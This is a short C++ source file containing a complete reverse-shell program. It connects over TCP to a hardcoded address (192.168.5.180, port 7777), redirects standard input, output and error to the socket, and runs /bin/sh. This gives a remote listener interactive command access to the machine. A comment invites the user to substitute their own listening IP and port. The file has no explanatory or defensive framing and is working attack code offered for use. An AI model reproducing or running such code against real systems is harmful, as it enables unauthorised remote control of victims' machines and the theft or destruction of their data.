#include <unistd.h>
#include <iostream>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
using namespace std;

int main() {
    int sockfd;
    struct sockaddr_in servaddr;

    // Change the IP address and port to your listening IP and port
    const char* ip = "192.168.5.180";
    int port =7777;    

    // Create a TCP socket
    sockfd = socket(AF_INET, SOCK_STREAM, 0);

    // Initialize server address structure
    servaddr.sin_family = AF_INET;
    servaddr.sin_addr.s_addr = inet_addr(ip);
    servaddr.sin_port = htons(port);

    // Establish connection to the server
    connect(sockfd, (struct sockaddr *)&servaddr, sizeof(servaddr));

    // Duplicate file descriptors for stdin, stdout, and stderr
    dup2(sockfd, 0);  // stdin
    dup2(sockfd, 1);  // stdout
    dup2(sockfd, 2);  // stderr

    // Set up arguments for execve
    char *args[] = {"/bin/sh", NULL};
    char *env[] = {NULL};

    // Execute shell
    execve("/bin/sh", args, env);

    return 0;
}
